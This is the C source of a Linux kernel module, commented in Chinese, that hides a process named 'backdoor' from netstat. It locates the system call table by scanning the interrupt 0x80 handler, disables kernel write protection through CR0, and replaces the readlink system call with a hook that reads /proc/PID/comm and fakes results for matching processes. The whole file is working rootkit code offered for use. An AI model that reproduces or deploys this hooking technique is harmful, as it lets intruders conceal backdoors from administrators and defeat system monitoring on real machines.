/**
 * @author 谢 方奎
 * @email xiefangkui@outlook.com
 * @create date 2017-11-03 04:28:30
 * @modify date 2017-11-03 04:28:30
 * @desc 使特定进程名对与netstat隐藏 在ubuntu 12.04环境中测试有效，其他环境不明
 *       通过修改readlink系统调用实现
*/
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h>   /* Needed for the macros */
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

#define _AUTHOR_ "xiefangkui"
#define _DESC_ "Hide netstat"

#define FILT_PS_NAME "backdoor"  // 隐藏进程名宏定义

static unsigned long **sct;  // 系统调用表

ssize_t (*orig_readlink)(const char *pathname, char *buf, size_t bufsize);  // 原系统调用函数指针

asmlinkage ssize_t hacked_readlink(const char *, char *, size_t);
void *find_sys_call_table(void);
void disable_write_protection(void);
void enable_write_protection(void);

void *find_sys_call_table(void)
{
    struct
    {
        unsigned short limit;
        unsigned int base;
    } __attribute__((packed)) idtr; // 中断描述符表寄存器结构

    struct
    {
        unsigned short offset_low;
        unsigned short segment_select;
        unsigned char reserved, flags;
        unsigned short offset_high;
    } __attribute__((packed)) * idt; // 中断描述符表结构

    unsigned long system_call = 0;
    char *call_hex = "\xff\x14\x85"; //call指令的机器码8514ff
    char *code_ptr = NULL;
    char *p = NULL;
    unsigned long sct = 0x0;
    int i = 0;

    __asm__("sidt %0"
            : "=m"(idtr));                                    //通过sidt指令获取中断描述符表寄存器的地址，这里面包含有idt表的首地址
    idt = (void *)(idtr.base + 8 * 0x80);                     //通过idtr里面的idt的首地址+偏移获取0x80中断处理程序的地址，由于idt中的每个门                                //是64位，8个字节，所以要乘以8，系统调用是0x80项，所以偏移为8*0x80。
    system_call = (idt->offset_high << 16) | idt->offset_low; //通过这项idt找到system_call的函数地址

    printk("system_call: %lx\n", system_call);
    code_ptr = (char *)system_call;
    for (i = 0; i < (100 - 2); i++)
    {   // 从0x80中断服务例程中搜索sys_call_table的地址，即通过找到第一个call指令
        // 的机器码8514ff来获取sys_call_table
        if (code_ptr[i] == call_hex[0] && code_ptr[i + 1] == call_hex[1] && code_ptr[i + 2] == call_hex[2])
        {
            p = &code_ptr[i] + 3;
            break;
        }
    }
    if (p)
    {
        sct = *(unsigned long *)p;
    }
    printk("SCT: %lx\n", sct);
    return (void *)sct;
}

asmlinkage ssize_t hacked_readlink(const char *pathname, char *buf, size_t bufsize)
{
    printk(KERN_INFO "%s\n", "into hacked_readlink");
    if (strncmp(pathname, "/proc/", 6)) // 如果不是检查进程目录，直接调用默认系统调用处理
        return orig_readlink(pathname, buf, bufsize);
    char *str_procpath = kmalloc(strlen(pathname) + 1, GFP_KERNEL);
    if (!str_procpath)
        return orig_readlink(pathname, buf, bufsize);
    memset(str_procpath, 0, strlen(pathname) + 1);
    memcpy(str_procpath, pathname, strlen(pathname));

    char *p_procpath_end = strchr(str_procpath + 6, '/'); // 查找"/proc/xxx/"
    p_procpath_end[1] = '\0';
    char *p_proc_commpath = kmalloc((strlen(str_procpath) + 5), GFP_KERNEL);
    if (!p_proc_commpath)
        return orig_readlink(pathname, buf, bufsize);
    // 获取"/proc/xxxx/comm"文件路径
    memset(p_proc_commpath, 0, strlen(str_procpath) + 5);
    memcpy(p_proc_commpath, str_procpath, strlen(str_procpath));
    strcat(p_proc_commpath, "comm");

    printk(KERN_INFO "%s\n", p_proc_commpath);

    // 打开文件"/proc/xxxx/comm"
    struct file *fd = filp_open(p_proc_commpath, O_RDONLY, 0);
    if (IS_ERR(fd))
    {
        printk("Error occured while opening file %s, exiting...\n", p_proc_commpath);
        return orig_readlink(pathname, buf, bufsize);
    }
    char readbuff[255];
    memset(readbuff, 0, 255);
    ssize_t count = 0;

    // 将kernel对内存地址检查的处理方式改为内核空间
    // 虚拟文件系统对文件的操作函数集合，会对传入的参数进行判断，如果参数不属于用户空间
    // 函数会直接返回一个错误
    mm_segment_t old_fs;
    old_fs = get_fs();
    set_fs(KERNEL_DS);

    // 读取文件
    count = fd->f_op->read(fd, readbuff, 255, &(fd->f_pos));

    // 恢复内存地址检查方式
    set_fs(old_fs);
    printk(KERN_INFO "read count is: %d\n", count);
    filp_close(fd, NULL);
    kfree(str_procpath);
    kfree(p_proc_commpath);
    if (count > 0)
        printk(KERN_INFO "%s\n", readbuff);
    else
        return orig_readlink(pathname, buf, bufsize);
    if (strstr(readbuff, FILT_PS_NAME))
    {
        printk(KERN_INFO "%s\n", "fand backdoor");
        return bufsize;
    }
    return orig_readlink(pathname, buf, bufsize);
}

void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

static int __init hide_netstat_init(void)
{
    printk(KERN_INFO "Insert hide_netstat.\n");
    sct = (void *)find_sys_call_table();
    orig_readlink = sct[__NR_readlink];
    disable_write_protection();
    sct[__NR_readlink] = (unsigned long *)&hacked_readlink;
    enable_write_protection();
    return 0;
}

static void __exit hide_netstat_exit(void)
{
    printk(KERN_INFO "Bye, restoring syscalls\n");
    disable_write_protection();
    sct[__NR_readlink] = (unsigned long *)orig_readlink;
    enable_write_protection();
}

module_init(hide_netstat_init);
module_exit(hide_netstat_exit);

/**
 * Infor of module
 */
MODULE_LICENSE("GPL");

MODULE_AUTHOR(_AUTHOR_);    /* Who wrote this module? */
MODULE_DESCRIPTION(_DESC_); /* What does this module do */